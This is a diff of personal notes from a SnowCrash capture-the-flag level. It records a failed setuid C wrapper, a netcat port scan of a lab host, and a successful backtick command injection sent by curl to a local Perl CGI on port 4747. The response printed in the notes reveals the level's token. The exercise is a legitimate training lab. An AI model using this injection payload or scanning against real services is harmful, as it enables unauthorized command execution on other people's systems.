@@ -1,1 +1,48 @@
-./level04.pl x='` getflag`'
+what I tried: 
+level04@SnowCrash:~$ cat /var/tmp/suid.c
+#include <unistd.h>
+main(int argc, char* argv[])
+{
+   char* sArgv[8];
+   sArgv[0] = (char*)"/usr/bin/perl";
+   sArgv[1] = (char*)"/home/user/level04/level04.pl";
+   //sArgv[2] = argv[1];
+   sArgv[2] = 0;
+   execv("/usr/bin/perl", sArgv);
+}
+like the exercice before:
+PATH=/var/tmp:$PATH ./level04.pl x='` getflag`'
+
+https://lea-linux.org/documentations/Dev-suid_scripts
+https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts
+
+But perl has a suid_safe mode that disallow user running suid script
+so this method doesn't work
+( ruby has a taint mode with perl -T ) // doesn't matter here
+
+https://www.cyberciti.biz/faq/linux-port-scanning/
+~/git/Snow-Crash(master*) » nc -zv 10.13.0.141 1-10000 2>&1 | grep -v refused | grep succeed       ygarrot@e3r8p21
+Connection to 10.13.0.141 port 80 [tcp/http] succeeded!
+Connection to 10.13.0.141 port 4242 [tcp/*] succeeded!
+Connection to 10.13.0.141 port 4646 [tcp/*] succeeded!
+Connection to 10.13.0.141 port 4747 [tcp/*] succeeded!
+
+
+level04@SnowCrash:~$ curl -v "http://localhost:4747?x=\`getflag\`"
+* About to connect() to localhost port 4747 (#0)
+*   Trying 127.0.0.1... connected
+> GET /?x=`getflag` HTTP/1.1
+> User-Agent: curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
+> Host: localhost:4747
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Date: Sun, 29 Dec 2019 15:17:01 GMT
+< Server: Apache/2.2.22 (Ubuntu)
+< Vary: Accept-Encoding
+< Content-Length: 58
+< Content-Type: text/html
+<
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+* Connection #0 to host localhost left intact
+* Closing connection #0
